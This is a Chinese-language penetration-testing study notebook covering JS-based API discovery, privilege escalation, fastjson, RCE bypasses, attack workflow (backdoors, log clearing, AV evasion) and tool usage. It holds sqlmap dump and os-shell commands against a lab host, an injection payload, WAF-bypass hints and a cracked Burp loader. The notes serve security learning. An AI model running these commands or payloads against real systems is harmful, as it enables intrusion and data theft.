<h3 id="7-js分析前后端分离站的未授权"><a href="#7-js分析前后端分离站的未授权" class="headerlink" title="7.js分析前后端分离站的未授权"></a>7.js分析前后端分离站的未授权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">js 未授权于利用 接口未授权</span><br><span class="line">对于前后端分离站点的确定</span><br><span class="line">1.分析什么样的站点时前后端分离</span><br><span class="line">查看js</span><br><span class="line">	main.js</span><br><span class="line">	app.js</span><br><span class="line">		后台接口路径api</span><br><span class="line">		全局配置</span><br><span class="line">		系统基础信息</span><br><span class="line">		前端路径</span><br><span class="line">	chunk.js</span><br><span class="line">		chunk函数分片</span><br><span class="line">		前端业务分片 某个业务逻辑的代码块</span><br><span class="line">			运营后台相关的东西</span><br><span class="line">包含了路径		演示地址https://admin-b2b2c.pickmall.cn/login</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1679035199649.png" alt="1679035199649"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">上传文件后找不到路径怎么办</span><br><span class="line">1.关注页面图片 文件 css路径</span><br><span class="line">2.js业务分析 upload 找到上传文件的代码 js代码位置 查看上传接口返回的路径 js如何进行操作的</span><br><span class="line">3.自行枚举</span><br><span class="line">doc data file images image img</span><br></pre></td></tr></table></figure>

<h3 id="8-如何通过js代码找接口"><a href="#8-如何通过js代码找接口" class="headerlink" title="8.如何通过js代码找接口"></a>8.如何通过js代码找接口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">请求里面套了一个请求	第二个请求是接口，而且也没有在后端对这个请求的合法性做验证</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1679058038752.png" alt="1679058038752"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">接口的发现</span><br><span class="line">jsfinder	推荐手工去找</span><br><span class="line">模板输出的</span><br><span class="line">	关键词	admin login path reg password system manager api</span><br><span class="line">1.关键的js框架不看 angular react vue core jquery</span><br><span class="line">*.min.js(类文件) datepick日期组件 select下拉框组件 page页面组件 upload上传 ui页面组件 map地图 echarts图标组件 editor图表组件 layui bootstarp cdn vendor</span><br><span class="line"></span><br><span class="line">2.编译型网站怎么找</span><br><span class="line">http://www.bootcss.com/	去对照</span><br><span class="line"></span><br><span class="line">3.工具</span><br><span class="line">jsfinder</span><br><span class="line"></span><br><span class="line">前后端分离的站 两个域名一个前端 一个侯丹</span><br><span class="line">jsfinder 全局爬取js 正则表达式去匹配 e.g. /&#x27;/url/&#x27;/			不一定准确</span><br></pre></td></tr></table></figure>

<h3 id="9-越权汇总"><a href="#9-越权汇总" class="headerlink" title="9.越权汇总"></a>9.越权汇总</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/robots.txt</span><br><span class="line">下图修改返回包cookie中u的值</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230318103054097.png" alt="image-20230318103054097"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">前端代码一切展示行为完全可控</span><br><span class="line">关注报文302重定向 返回包</span><br><span class="line"></span><br><span class="line">可疑参数</span><br><span class="line">isadmin roleid grouplist homepath access role_type user_type</span><br><span class="line"></span><br><span class="line">如果cookie内容多可以一个个删了看回显包变化</span><br><span class="line"></span><br><span class="line">有数字参数搞一下 用户的搞一下 role搞一下</span><br></pre></td></tr></table></figure>

<h3 id="10-fastjson"><a href="#10-fastjson" class="headerlink" title="10.fastjson"></a>10.fastjson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vulhub /vulhub/fastjson/1.2.24-rce</span><br><span class="line">启动docker报错 尝试关闭防火墙 关闭selinux /etc/sysconfig/selinux设置disabled 不好使</span><br><span class="line">最后修改/etc/docker/daemon.json 中的registry-mirrors属性里面本来是qiniu.com很离谱</span><br><span class="line">参考https://blog.csdn.net/ayychiguoguo/article/details/121079728</span><br><span class="line">https://blog.csdn.net/chshgod1/article/details/124574733</span><br><span class="line"></span><br><span class="line">docker ps查看docker进程</span><br><span class="line">docker exec -it ID号 bash 进入该docker进程的命令行</span><br><span class="line"></span><br><span class="line">如何确定fastjson</span><br><span class="line">修改发送的json数据包 使它报错 com.alibaba.json</span><br><span class="line">后端java服务 存在json传输 构造报错 盲猜 1.2.24-27</span><br><span class="line">域名递归解析 dnslog</span><br></pre></td></tr></table></figure>

<h3 id="11-RCE"><a href="#11-RCE" class="headerlink" title="11.RCE"></a>11.RCE</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">不同站点 不同编程语言 命令执行的效果</span><br><span class="line">php shell() system()</span><br><span class="line">jsp .exe(&#x27;&#x27;)</span><br><span class="line">java</span><br><span class="line">python os.command()</span><br><span class="line">node (越来越流行)</span><br><span class="line"></span><br><span class="line">业务场景（邮件 某个独立的服务监控 不与数据库交互的地方 ping）</span><br><span class="line"></span><br><span class="line">/admin/getSystemStatus?aa=system.os.ssyss.ls</span><br><span class="line">1.尝试能否使用代码内部的类库的包</span><br><span class="line">2.能否闭合之前的逻辑代码进行命令执行执行</span><br><span class="line">3.常见RCE版本</span><br><span class="line"></span><br><span class="line">能否进行类库注入 前提是知道spring 内置可能存在哪些类库及对应的参数</span><br><span class="line"></span><br><span class="line">能看到一些东西的返回</span><br><span class="line">dnslog.cn</span><br><span class="line">能否进行变量覆盖</span><br><span class="line"></span><br><span class="line">遇到拦截怎么办</span><br><span class="line">1.函数替换</span><br><span class="line">2.常见的命令执行函数 有些框架直接拦截(不建议直接用常用函数)</span><br><span class="line">3.file_get_contents dirsan() extract() ====&gt; ctf</span><br><span class="line">4.造成危害 ---》读文件 数据库 代码逻辑文件</span><br><span class="line">5.基于框架的内置函数 waf基于原代码函数的二次封装的函数</span><br><span class="line"></span><br><span class="line">难点</span><br><span class="line">1.难于发现 不好找</span><br><span class="line">2.发现了 利用不了</span><br><span class="line">3.挖不到</span><br><span class="line"></span><br><span class="line">浓厚代码知识</span><br></pre></td></tr></table></figure>

<h3 id="14-渗透测试流程"><a href="#14-渗透测试流程" class="headerlink" title="14.渗透测试流程"></a>14.渗透测试流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">内网常用操作</span><br><span class="line">	横向攻击  	从一台机子移动到另外一台进一步渗透</span><br><span class="line">	代理隧道	通过第三方转发或者开启对应的端口服务之间进行通信的方式</span><br><span class="line">权限维持</span><br><span class="line">	留后门</span><br><span class="line">	痕迹清除	清楚系统内部当中一些日志等其他涉及攻击者的相关信息</span><br><span class="line">cs上线</span><br><span class="line">	下载木马 病毒 恶意脚本 远程执行 摄像头权限</span><br><span class="line">免杀</span><br><span class="line">	过waf 360安全软件的操作 恶意混淆</span><br></pre></td></tr></table></figure>

<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h3 id="Xray"><a href="#Xray" class="headerlink" title="Xray"></a>Xray</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#端口转发</span><br><span class="line"><span class="function">https://<span class="title">blog.csdn.net</span>/<span class="title">qq_42096378</span>/<span class="title">article</span>/<span class="title">details</span>/124039392</span></span><br><span class="line"><span class="function">#<span class="title">xray</span>监听7890端口（--<span class="title">listen</span> <span class="title">local</span>:端口 代替-<span class="title">u</span> <span class="title">url</span>） <span class="title">bp</span>监听8080端口然后用<span class="title">upstream</span> <span class="title">proxy</span> <span class="title">server</span>转发到7890端口</span></span><br><span class="line"><span class="function"><span class="title">windows</span></span></span><br><span class="line"><span class="function"><span class="title">xray_windows_386.exe</span> <span class="title">ws</span> --<span class="title">url</span> <span class="title">http</span>://<span class="title">testphp.vulnweb.com</span> --<span class="title">html</span>-<span class="title">output</span> 1.<span class="title">html</span></span></span><br></pre></td></tr></table></figure>

<h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows</span><br><span class="line">https://blog.csdn.net/qq_43514711/article/details/127119538</span><br><span class="line">用户名hyy19	密码123</span><br><span class="line">需要管理员权限	net start &quot;Tenable Nessus&quot;</span><br><span class="line">https://127.0.0.1:8834/#/</span><br></pre></td></tr></table></figure>

<h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">burpsuite 目录下	双击不晓得为啥不好使了</span><br><span class="line">cmd	java -jar BurpLoaderKeygen.jar</span><br><span class="line"></span><br><span class="line">#	https://blog.csdn.net/qq1140037586/article/details/128455338</span><br><span class="line">插件		NEW_xp_CAPTCHA</span><br><span class="line">python环境地址	D:\BaiduNetdiskDownload\NEW_xp_CAPTCHA win64 python环境完整版\NEW_xp_CAPTCHA\Python36</span><br><span class="line">发送到intruder</span><br><span class="line">线程1</span><br></pre></td></tr></table></figure>

<h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_64378913/article/details/124439539</span><br><span class="line">-u  <span class="string">&quot;url&quot;</span>		<span class="comment">#检测注入点</span></span><br><span class="line">--dbs			<span class="comment">#列出所有数据库的名称</span></span><br><span class="line">--current-db	<span class="comment">#列出当前数据库的名称</span></span><br><span class="line">-D				<span class="comment">#指定一个数据库</span></span><br><span class="line">--tables		<span class="comment">#列出所有表名</span></span><br><span class="line">-T				<span class="comment">#指定表名</span></span><br><span class="line">--columns		<span class="comment">#列出所有字段名</span></span><br><span class="line">-C				<span class="comment">#指定字段</span></span><br><span class="line">--dump			<span class="comment">#列出字段内容</span></span><br><span class="line"><span class="comment">#	post注入</span></span><br><span class="line">-r xxx.txt <span class="comment">#xxx.txt为http数据包</span></span><br><span class="line"></span><br><span class="line">–cookie <span class="comment">#指定cookie</span></span><br><span class="line">–os-shell <span class="comment">#获取shell</span></span><br><span class="line"></span><br><span class="line">1）判断可注入的参数；</span><br><span class="line">2）判断可以用哪种SQL注入技术来注入；</span><br><span class="line">3）识别出哪种数据库；</span><br><span class="line">4）根据用户选择，读取哪些数据。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	get请求注入</span></span><br><span class="line"><span class="comment">#	sqllab</span></span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1</span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1 --dbs</span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1 --current-db</span><br><span class="line">...</span><br><span class="line">sqlmap.py -u http://192.168.56.1/sqllab/sqllab/Less-1/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> -C <span class="string">&quot;password,username&quot;</span> --dump</span><br><span class="line"></span><br><span class="line">sqlmap利用谷歌批量扫描注入点</span><br><span class="line">	https://blog.csdn.net/tomyyyyyy/article/details/115688999</span><br><span class="line">绕防火墙的思路</span><br><span class="line">	/tamper目录可修改发送数据包 见zz_rdog.py</span><br></pre></td></tr></table></figure>

<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/m0_46363249/article/details/119983709</span><br><span class="line">逻辑运算符</span><br><span class="line">app=&quot;Coremail&quot; &amp;&amp;  country=CN          #查找使用coremail并且在中国境内的网站</span><br><span class="line">title=&quot;管理后台&quot; ||  title=&quot;登录后台&quot;   #查找title中含有管理后台或者登录后台的网站</span><br><span class="line">port!=&quot;80&quot;                             #匹配端口不为80端口的服务</span><br><span class="line">搜索域名中包含qq.com</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1677399625944.png" alt="1677399625944"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">搜索qq.com的子域名		   domain=&quot;qq.com&quot;</span><br><span class="line">统计全球的Apache				server=&quot;Apache&quot;	返回包包含Server:Apach</span><br><span class="line">网页body内包含后台				body=“后台” &amp;&amp; domain=&quot;youku.com&quot;</span><br><span class="line">搜索证书 					cert=&quot;baidu&quot;	百度公司检查自己域名时候有心脏出血漏洞</span><br><span class="line">搜索指定应用网站</span><br><span class="line">	app=&quot;Coremail&quot;                              #查找使用Coremail的网站</span><br><span class="line">    app=&quot;Oracle-Weblogic_interface_7001&quot;        #查找使用Weblogic的网站</span><br><span class="line">    app=&quot;CCTV-Cameras&quot;                          #查找使用九安视频监控的网站</span><br><span class="line">    app=&quot;奇安信-天擎&quot;                            #查找使用天擎的网站</span><br><span class="line">    app=&quot;Apache-Shiro&quot;                          #查找使用shiro的网站</span><br><span class="line">    app=&quot;struts2&quot;                               #查找使用struts2的网站</span><br><span class="line">    app=&quot;TongDa-OA&quot;                             #查找使用通达OA的网站</span><br><span class="line">    app=&quot;致远互联-OA&quot;                            #查找使用致远OA的网站</span><br><span class="line">    app=&quot;泛微-协同办公OA&quot;                        #查找使用泛微OA的网站</span><br><span class="line">    app=&quot;万户网络-ezOFFICE&quot;                      #查找使用万户OA的网站</span><br><span class="line">    app=&quot;ATLASSIAN-Confluence&quot;                  #查找使用confluence的网站</span><br><span class="line">    app=&quot;f5-BIGIP&quot;                              #查找使用f5的网站</span><br><span class="line">    title=&quot;+ ID_VC_Welcome +&quot;                   #查找Vcenter的网站</span><br><span class="line">指定端口</span><br><span class="line">	port=&quot;3389&quot;   #查找开放3389端口的主机</span><br><span class="line">    ports=&quot;1433,3306,3389&quot;      #查找开放了1433,3306,3389端口的主机</span><br><span class="line">    ports==&quot;1433,3306,3389&quot;		#查找只开放了1433,3306,3389端口的主机</span><br><span class="line">指定协议的ip</span><br><span class="line">	protocol=mysql       #查找使用mysql的ip</span><br><span class="line">    protocol=mssql       #查找使用mssql的ip</span><br><span class="line">    protocol=oracle      #查找使用oracle的ip</span><br><span class="line">    protocol=redis       #查找使用redis的ip</span><br><span class="line">ip或网段信息</span><br><span class="line">	ip=&quot;220.181.38.148&quot;   #查找指定ip的信息</span><br><span class="line">	ip=&quot;220.181.38.0/24&quot;  #查找指定网段的信息</span><br><span class="line">框架特有的css/js文件</span><br><span class="line">	&quot;style/lrtk.css&quot;</span><br><span class="line">常用的内容</span><br><span class="line">	title=&quot;管理后台&quot;     #查找title含有管理后台的ip</span><br><span class="line">    header=&quot;thinkphp&quot;   #查找响应头含有thinkphp的ip</span><br><span class="line">    body=&quot;管理后台&quot;      #</span><br><span class="line">    domain=&quot;baidu.com&quot;  #查找指定根域的所有子域</span><br><span class="line">    host=&quot;baidu&quot;        #查找host字段中带有baidu的网站      </span><br><span class="line">    country=&quot;CN&quot;        #查找中国境内的ip</span><br><span class="line">    region=&quot;Jiangsu&quot;    #查找江苏地区的ip</span><br><span class="line">    cert=&quot;phpinfo.me&quot;   #搜索证书(如https证书、imaps证书等)中含有&quot;phpinfo.me&quot;关键词的网站和IP</span><br><span class="line">    server=&quot;apache&quot;     #服务器使用apache的网站</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#以下不一定好使</span></span><br><span class="line"><span class="comment">#icon_hash=&quot;-1507567067&quot; 可以使用以下代码读取ico，并生成搜索语法（Python2）</span></span><br><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;/favicon.ico&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;logo&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    url = url + <span class="string">&quot;/favicon.ico&quot;</span></span><br><span class="line"><span class="built_in">print</span> url</span><br><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)</span><br><span class="line">favicon = response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span> = mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nicon_hash=\&quot;&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)+<span class="string">&quot;\&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/beyondp/article/details/126055437</span><br><span class="line">1.site:限制搜索范围在某网站或顶级域名中</span><br><span class="line">2.inurl:搜索网页包含的url地址</span><br><span class="line">3.intext:只搜索网页部分包含的文字</span><br><span class="line">4.intitle:限制搜索的网页标题</span><br><span class="line">5.filetype:搜索文件的后缀名或拓展名(文件类型)</span><br><span class="line"></span><br><span class="line">1.查找后台管理地址</span><br><span class="line">site:xxx.com(目标网址的域名) intext:管理/后台…</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:login/admin…</span><br><span class="line">site:xxx.com(目标网址的域名) intitle:管理/后台…</span><br><span class="line">2.查找上传类漏洞地址</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:file</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:upload</span><br><span class="line">3.查找注入漏洞地址</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:php? id=</span><br><span class="line">4.查找登录界面</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:“/admin/login.php”</span><br><span class="line">5.查找指定站点xls文件</span><br><span class="line">site:xxx.com(目标网址的域名) filetype:xls</span><br><span class="line">6.查找编辑器页面</span><br><span class="line">site:xxx.com(目标网址的域名) inurl:ewebeditor</span><br></pre></td></tr></table></figure>

<h3 id="ARL"><a href="#ARL" class="headerlink" title="ARL"></a>ARL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">装在了kali		/home/hyy19/ARL/docker</span><br><span class="line">config-docker.yaml中有配置fofa</span><br><span class="line">docker-compose up -d</span><br><span class="line">docker-compose down</span><br><span class="line">https:192.168.213.130:5003</span><br></pre></td></tr></table></figure>

<h3 id="Antsword"><a href="#Antsword" class="headerlink" title="Antsword"></a>Antsword</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果更新</span><br><span class="line">d盘app_install antsword文件夹里面删了</span><br><span class="line">d盘app_install antsword-loader-v4.0.3-win32-x64 exe文件打开初始化即可</span><br></pre></td></tr></table></figure>

<h3 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">管理员运行 .\teamserver.bat 192.168.56.1 密码1</span><br><span class="line">start.bat 用户名任意 密码1</span><br></pre></td></tr></table></figure>



<h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sql注入案例</span><br><span class="line">1-1返回空</span><br><span class="line">1-0返回正常</span><br><span class="line">尝试and 1,报错,fuzz之后发现不能使用空格,使用1-sleep(1)报错,不能使用扩好，询问chatgpt,发现可以使用or造成查询所有数据，修改payload为or\u000b1，出所有数据,造成危害</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">充值0.019-&gt;0.01用户充-&gt;0.02服务端充</span><br></pre></td></tr></table></figure>

<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">	//	单行</span><br><span class="line">	/**/</span><br><span class="line">php</span><br><span class="line">	// 	#	单行</span><br><span class="line">	/**/</span><br><span class="line">MySQL注释符有三种：</span><br><span class="line">    #注释内容 &quot;--  注释内容&quot; 表示单行注释</span><br><span class="line">    /*注释内容*/</span><br><span class="line">phthon</span><br><span class="line">	#注释内容</span><br><span class="line">	&#x27;&#x27;&#x27;注释内容&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">hex		解释</span><br><span class="line">00		空字符</span><br><span class="line">0A		换行符</span><br><span class="line">0D		回车</span><br><span class="line">20		空格</span><br><span class="line">22		&quot;</span><br><span class="line">23		#</span><br><span class="line">25		%</span><br><span class="line">26		&amp;</span><br><span class="line">27		&#x27;</span><br><span class="line">2B		+</span><br><span class="line">2C		，</span><br><span class="line">2D		-</span><br><span class="line">2E		.</span><br><span class="line">2F		/</span><br><span class="line">30-39	字符0-9</span><br><span class="line">3A		:</span><br><span class="line">3B		;</span><br><span class="line">3C		&lt;</span><br><span class="line">3D		=</span><br><span class="line">3E		&gt;</span><br><span class="line">40		@</span><br><span class="line">41-5A	字符A-Z</span><br><span class="line">61-7A	字符a-z</span><br><span class="line">7E		~</span><br><span class="line">7F		删除</span><br></pre></td></tr></table></figure>

<h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p><img src="C:\Users\hyy\Desktop\安全笔记.assets\oauth2.png" alt="oauth2"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource owner是github</span><br><span class="line">resource server和authorization server都是</span><br><span class="line">b步骤获得授权信息是关键</span><br><span class="line">b获得的授权信息可以去获取access_token在用access_token获取资源</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\oauth2_2.png" alt="oauth2_2"></p>
<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\implicit_grant.png" alt="implicit_grant"></p>
